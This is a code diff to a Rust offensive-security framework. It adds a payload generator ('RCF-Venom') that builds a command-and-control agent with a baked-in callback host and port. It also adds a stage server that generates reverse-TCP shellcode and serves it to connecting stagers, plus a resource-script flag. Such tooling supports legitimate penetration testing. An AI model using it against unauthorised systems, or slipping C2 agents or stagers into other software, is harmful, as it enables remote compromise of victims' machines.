@@ -43,6 +43,10 @@ struct Cli {
     /// Enable TLS certificate validation (default: disabled for pentesting)
     #[arg(long, global = true)]
     strict_tls: bool,
+
+    /// Run a resource script file and exit
+    #[arg(short = 'r', long, global = true)]
+    resource: Option<String>,
 }
 
 #[derive(Subcommand)]
@@ -110,6 +114,14 @@ enum Commands {
         /// Execute the payload locally after generation (testing only)
         #[arg(long)]
         execute: bool,
+
+        /// Generate staged payload (stager + stage)
+        #[arg(long)]
+        staged: bool,
+
+        /// Stage output file (only with --staged)
+        #[arg(long)]
+        stage_output: Option<String>,
     },
 
     /// Scan targets
@@ -358,8 +370,10 @@ async fn main() -> anyhow::Result<()> {
             output,
             encoder,
             execute,
+            staged,
+            stage_output,
         }) => {
-            run_venom(&payload, &lhost, lport, &format, output.as_deref(), encoder.as_deref(), execute).await?;
+            run_venom(&payload, &lhost, lport, &format, output.as_deref(), encoder.as_deref(), execute, staged, stage_output.as_deref()).await?;
             return Ok(());
         }
 
@@ -431,6 +445,14 @@ async fn main() -> anyhow::Result<()> {
         return Ok(());
     }
 
+    // Handle -r resource script execution
+    if let Some(ref script_path) = cli.resource {
+        use rcf_console::RcfConsole;
+        let mut console = RcfConsole::new(manager, context)?;
+        console.run_resource_script(script_path).await?;
+        return Ok(());
+    }
+
     // Start interactive console
     use rcf_console::RcfConsole;
     let mut console = RcfConsole::new(manager, context)?;
@@ -471,6 +493,112 @@ async fn run_module_non_interactive(
     Ok(())
 }
 
+/// Build the C2 agent binary with baked-in connection parameters.
+fn run_venom_agent(lhost: &str, lport: u16, output: Option<&str>) -> anyhow::Result<()> {
+    println!("  Type:      agent");
+    println!("  LHOST:     {}", lhost);
+    println!("  LPORT:     {}", lport);
+
+    // Build the agent with baked-in connection parameters
+    let status = std::process::Command::new("cargo")
+        .args([
+            "build",
+            "-p", "rcf-agent",
+            "--release",
+        ])
+        .env("RCF_AGENT_HOST", lhost)
+        .env("RCF_AGENT_PORT", &lport.to_string())
+        .env_remove("RCF_AGENT_PSK") // No PSK by default; user can set via CLI args on agent
+        .status()
+        .map_err(|e| anyhow::anyhow!("Failed to run cargo build: {}", e))?;
+
+    if !status.success() {
+        anyhow::bail!("Agent build failed");
+    }
+
+    let built_path = "target/release/rcf-agent";
+    let size = std::fs::metadata(built_path)
+        .map(|m| m.len())
+        .unwrap_or(0);
+
+    println!("\n{} Agent built: {} ({} bytes)", "[+]".green(), built_path, size);
+
+    // Copy to output path if specified
+    if let Some(out_path) = output {
+        validate_write_path(out_path)?;
+        std::fs::copy(built_path, out_path)
+            .map_err(|e| anyhow::anyhow!("Failed to copy agent to {}: {}", out_path, e))?;
+        println!("{} Saved to {}", "[+]".green(), out_path);
+    }
+
+    println!("\n{} Usage:", "[*]".yellow());
+    println!("  {} ./rcf-agent  (connects to {}:{})", "   ", lhost, lport);
+    println!("  {} ./rcf-agent --host <ip> --port <port> --psk <key>  (override defaults)", "   ");
+
+    Ok(())
+}
+
+/// Run a stage server that delivers stages to connecting stagers.
+async fn run_venom_stage_server(lhost: &str, lport: u16, stage_output: Option<&str>) -> anyhow::Result<()> {
+    use rcf_payload::{
+        PayloadConfig, PayloadType, PayloadGenerator,
+        Platform, Arch, OutputFormat, StageServer,
+    };
+
+    println!("{}", "[*] RCF-Venom — Stage Server".bold().green());
+    println!("  Listening on: {}:{}", lhost, lport);
+
+    // Generate the stage payload
+    let platform = std::env::var("RCF_PLATFORM")
+        .ok()
+        .and_then(|p| p.parse::<Platform>().ok())
+        .unwrap_or(Platform::Linux);
+
+    let arch = std::env::var("RCF_ARCH")
+        .ok()
+        .and_then(|a| a.parse::<Arch>().ok())
+        .unwrap_or(Arch::X64);
+
+    let config = PayloadConfig {
+        payload_type: PayloadType::ReverseTcp,
+        platform: platform.clone(),
+        arch: arch.clone(),
+        lhost: lhost.to_string(),
+        lport,
+        rhost: None,
+        rport: None,
+        command: None,
+        stage_url: None,
+        format: OutputFormat::Raw,
+        encoder: None,
+        polymorphic: false,
+        nop_sled_size: None,
+        bad_chars: vec![0x00],
+    };
+
+    let generator = PayloadGenerator::new();
+    let stage_output_data = generator.generate(&config).await?;
+    let stage_data = stage_output_data.shellcode.clone();
+
+    // Save stage to file if requested
+    if let Some(path) = stage_output {
+        validate_write_path(path)?;
+        std::fs::write(path, &stage_data)
+            .map_err(|e| anyhow::anyhow!("Failed to write stage to {}: {}", path, e))?;
+        println!("\n{} Stage saved to: {} ({} bytes)", "[+]".green(), path, stage_data.len());
+    }
+
+    println!("\n{} Stage size: {} bytes", "[*]".yellow(), stage_data.len());
+    println!("{} Platform: {}/{}", "[*]".yellow(), platform, arch);
+    println!("\n{} Starting stage server...", "[*]".cyan());
+    println!("{} Stagers connecting will receive this stage", "[*]".cyan());
+    println!("{} Press Ctrl+C to stop\n", "[*]".cyan());
+
+    // Start the stage server
+    let server = StageServer::new(stage_data, lport);
+    server.run().map_err(|e| anyhow::anyhow!("Stage server error: {}", e))
+}
+
 async fn run_venom(
     payload_type: &str,
     lhost: &str,
@@ -479,13 +607,25 @@ async fn run_venom(
     output: Option<&str>,
     encoder: Option<&str>,
     execute: bool,
+    staged: bool,
+    stage_output: Option<&str>,
 ) -> anyhow::Result<()> {
     use rcf_payload::{
         PayloadConfig, PayloadType, PayloadGenerator, PayloadEncoder,
-        Platform, Arch, OutputFormat,
+        Platform, Arch, OutputFormat, StageServer,
     };
 
     println!("{}", "[*] RCF-Venom — Payload Generator".bold().green());
+
+    // Special case: generate C2 agent binary
+    if payload_type == "agent" {
+        return run_venom_agent(lhost, lport, output);
+    }
+
+    // Special case: run stage server
+    if staged && payload_type == "server" {
+        return run_venom_stage_server(lhost, lport, stage_output).await;
+    }
 
     // Parse payload type
     let ptype: PayloadType = payload_type
